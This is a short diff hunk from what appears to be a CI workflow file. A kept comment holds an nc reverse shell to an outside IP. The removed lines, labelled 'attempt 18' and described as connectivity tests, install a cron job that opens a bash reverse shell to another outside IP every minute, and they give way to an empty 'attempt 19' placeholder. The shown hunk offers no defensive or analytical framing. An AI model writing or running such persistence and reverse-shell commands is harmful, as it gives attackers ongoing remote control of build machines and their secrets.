@@ -55,9 +55,7 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # INTENTO 18 186.189.75.20
-          # Comandos para probar conectividad
-          (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/186.189.75.20/4444 0>&1'") | crontab -
+          # INTENTO 19
           
  
           
